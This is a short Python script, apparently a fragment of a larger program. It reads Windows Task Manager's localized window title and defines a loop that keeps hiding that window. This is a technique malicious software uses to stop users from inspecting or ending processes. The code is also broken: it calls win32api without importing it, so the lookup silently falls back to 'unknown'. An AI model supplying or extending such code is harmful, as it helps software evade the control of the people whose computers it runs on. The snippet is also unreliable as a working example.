import win32gui, win32con

def getFileDescription(windows_exe): # find description of exe for different languages
    try:
        language, codepage = win32api.GetFileVersionInfo(windows_exe, '\\VarFileInfo\\Translation')[0]
        stringFileInfo = u'\\StringFileInfo\\%04X%04X\\%s' % (language, codepage, "FileDescription")
        description = win32api.GetFileVersionInfo(windows_exe, stringFileInfo)
    except:
        description = "unknown"
        
    return description


taskmgrtitle = getFileDescription('C:\Windows\System32\Taskmgr.exe') 


print(taskmgrtitle)

def disableTaskmgr():
    while(1):
        taskmgr = win32gui.FindWindow(None,taskmgrtitle)
        win32gui.ShowWindow(taskmgr , win32con.SW_HIDE)